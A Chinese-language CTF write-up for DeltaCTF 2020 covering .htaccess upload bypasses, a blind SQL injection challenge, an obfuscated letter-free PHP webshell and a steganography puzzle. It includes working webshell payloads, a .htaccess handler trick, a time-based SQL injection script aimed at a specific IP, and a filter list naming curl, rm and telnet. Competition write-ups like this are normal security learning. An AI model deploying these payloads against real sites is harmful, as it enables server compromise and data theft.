# DeltaCTF 2020

## Checkin

主要是``.htaccess``换行符绕过吧，比赛的时候没反应过来...

ban了 ``perl|pyth|ph|auto|curl|base|>|rm|ruby|openssl|war|lua|msf|xter|telnet``

但是``.htaccess``支持换行符

所以像这样就行

```
AddHandler application/x-httpd-p\
hp .jpg
```

然后短标签不闭合可以执行来绕过

```
<?=eval($_REQUEST['eki']);
```

虽然只有一句但是没有``?>``还是得加分号

如果服务器没开短标签的话

可以加个

```
p\
hp_value short_open_tag 1
```

然后其实这题预期应该是CGI的,过滤了``perl|ruby``这些，但是可以利用``bash``

.htaccess

```
Options +ExecCGI
AddHandler cgi-script .sh
```

exp.sh

```bash
#!/bin/bash
echo "Content-Type: text/plain"
echo ""
cat /flag
exit 0
```

## Mixture

这题比赛时只做了一半，后面因为水平太菜就做不下去了

前半部分主要是在于注入点寻找吧

用除admin的账号名登陆F12看到有``<!--orderby-->``的注释

然后尝试注一下

发现sleep被ban了，语句语法错误也么得回显，考虑其他方法盲注

```python
#coding=utf-8
import requests
import threading
import string
import time
import sys
pt = '{}0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_-+[]?<>@!#$%^&*~'
url="http://134.175.185.244/member.php"
headers = {"Content-Type": "application/x-www-form-urlencoded"}

sql="database()"

def blindtest(start,end):
    ret=""
    for i in range(start,end):
        l=32
        r=128
        while(l+1<r):
            mid=(l+r)/2
            payload="and case when (ascii(substr({},{},1))>{}) then (benchmark(1000000,sha(1))) else 2 end".format(sql,i,mid)
            #print payload
            cookies = {
                "PHPSESSID":'k4vs406ichnlsfqpt1brpo53nb'
            }
            param = {
                "orderby":payload,
            }
            print param
            req=requests.get(url,params=param,cookies=cookies)
            start = time.time()
            print req.text
            if(time.time()-start>4):
                l=mid
            else :
                r=mid
        if(chr(r) not in pt):
            break
        ret=ret+chr(r)
        sys.stdout.write("[-]{0} Result : -> {1} <-\r".format(threading.current_thread().name,ret))
        sys.stdout.flush()
    print(threading.current_thread().name+"[+]Result : ->"+ret+"<-")

blindtest(1,2000)
```

## Hard_Pentest_1

这题后面的渗透部分没有做出 msf还是不大会用

前面传马的部分利用了无数字字母shell还有后缀字符大小写绕过（winodws环境）

利用php字符串执行函数来构造

比如这个phpinfo

```php
<?=[$_=[],
$_=@"$_",
$_=$_['!'=='@'],
$__=$_,
$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,
$___=$__,//P

$__=$_,
$__++,$__++,$__++,$__++,$__++,$__++,$__++,
$___.=$__,//H

$__=$_,
$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,
$___.=$__,//P

$__=$_,
$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,
$___.=$__,//I

$__=$_,
$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,
$___.=$__,//N

$__=$_,
$__++,$__++,$__++,$__++,$__++,
$___.=$__,//F

$__=$_,
$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,
$___.=$__,//O


$___()]?>
```

然后可以利用这个传shell

```php
<?=[$_=[],
$_=@"$_",
$_=$_['!'=='@'],
$____='_',
$__=$_,
$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,
$____.=$__,
$__=$_,
$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,
$____.=$__,
$__=$_,
$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,
$____.=$__,
$__=$_,
$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,
$____.=$__,
$_=$$____,
$_["__"]($_["_"])]?>

```

然后就可以生成小马了

## Life

binwalk 拿到图片和压缩

根据名字联想到Conway's Life Game (这脑洞...)

发现有二维码生成，拿到压缩包密码

txt提示filp

filp->base64->filp->hex拿到flag

